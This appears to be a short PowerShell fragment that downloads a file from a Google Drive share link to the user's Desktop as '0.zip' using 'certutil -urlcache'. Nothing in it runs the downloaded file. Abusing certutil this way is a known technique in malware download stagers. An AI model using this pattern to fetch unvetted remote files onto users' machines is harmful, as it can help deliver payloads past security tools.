
$zipFilePath = "https://drive.google.com/file/d/1h_hZ-N7su1XsLpYuBz3LCS1tGThfj1C3/view?usp=sharing"
$desktopPath = [Environment]::GetFolderPath("Desktop")
certutil -urlcache -split -f $zipFilePath "$desktopPath\0.zip"
